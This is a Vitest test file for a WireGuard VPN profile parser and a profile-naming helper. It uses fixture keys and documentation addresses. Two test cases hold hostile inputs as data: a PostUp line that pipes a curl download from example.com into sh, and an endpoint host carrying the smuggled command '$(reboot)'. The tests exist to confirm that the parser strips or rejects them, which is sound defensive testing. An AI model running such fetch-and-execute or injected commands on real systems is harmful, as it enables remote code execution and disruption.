import { describe, expect, it } from "vitest";
import { MAX_PROFILE_BYTES } from "@/lib/vpn/profile-limits";
import { parseProfile, profileName } from "@/lib/vpn/profile";

const PRIVATE = `${"a".repeat(42)}A=`;
const PUBLIC = `${"b".repeat(42)}E=`;
const SHARED = `${"c".repeat(42)}I=`;

const file = (extra = "", peer = ""): string => `[Interface]
# Device: fixture
PrivateKey = ${PRIVATE}
Address = 10.2.0.2/32
DNS = 10.2.0.1
${extra}

[Peer]
PublicKey = ${PUBLIC}
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = 203.0.113.7:51820
${peer}
`;

describe("parseProfile", () => {
    it("reads a provider's file", () => {
        expect(parseProfile(file())).toEqual({
            privateKey: PRIVATE,
            addresses: ["10.2.0.2/32"],
            dns: ["10.2.0.1"],
            mtu: null,
            publicKey: PUBLIC,
            presharedKey: null,
            endpoint: "203.0.113.7",
            port: 51820,
            allowedIps: ["0.0.0.0/0", "::/0"]
        });
    });

    it("reads both address families, a shared key, an MTU and a server name", () => {
        const text = file("MTU = 1320", `PresharedKey = ${SHARED}`)
            .replace("10.2.0.2/32", "10.2.0.2/32, fc00:bbbb::2/128")
            .replace("203.0.113.7:51820", "se-sto.example.net:3000");
        expect(parseProfile(text)).toMatchObject({
            addresses: ["10.2.0.2/32", "fc00:bbbb::2/128"],
            presharedKey: SHARED,
            mtu: 1320,
            endpoint: "se-sto.example.net",
            port: 3000
        });
    });

    it("reads an IPv6 server, Windows line ends and a byte-order mark", () => {
        const text = `\uFEFF${file().replace("203.0.113.7:51820", "[2001:db8::1]:51820")}`;
        expect(parseProfile(text.replace(/\n/g, "\r\n"))).toMatchObject({
            endpoint: "2001:db8::1",
            port: 51820
        });
    });

    it("leaves a search domain out of the DNS servers", () => {
        expect(parseProfile(file().replace("10.2.0.1", "10.2.0.1, corp.example"))?.dns).toEqual([
            "10.2.0.1"
        ]);
    });

    it("never keeps a command", () => {
        const profile = parseProfile(file("PostUp = curl https://example.com/x | sh"));
        expect(JSON.stringify(profile)).not.toContain("curl");
    });

    it.each([
        ["no server", file().replace(/\[Peer\][\s\S]*/, "")],
        ["two servers", `${file()}\n[Peer]\nPublicKey = ${PUBLIC}\n`],
        ["a bad key", file().replace(PRIVATE, "short")],
        ["no port", file().replace(":51820", "")],
        ["a port out of range", file().replace(":51820", ":70000")],
        ["a bad network", file().replace("10.2.0.2/32", "10.2.0.2/99")],
        ["a host with a shell in it", file().replace("203.0.113.7", "$(reboot)")],
        ["text", "not a tunnel"],
        ["something huge", `${file()}${"#".repeat(MAX_PROFILE_BYTES)}`]
    ])("refuses %s", (_, text) => {
        expect(parseProfile(text)).toBeNull();
    });
});

describe("profileName", () => {
    it("is the file's name without its folder or extension", () => {
        expect(profileName("C:\\down\\se-sto-wg-001.conf")).toBe("se-sto-wg-001");
        expect(profileName("proton-NL-12.conf")).toBe("proton-NL-12");
    });

    it("falls back when nothing is left", () => {
        expect(profileName(".conf")).toBe("VPN");
    });
});
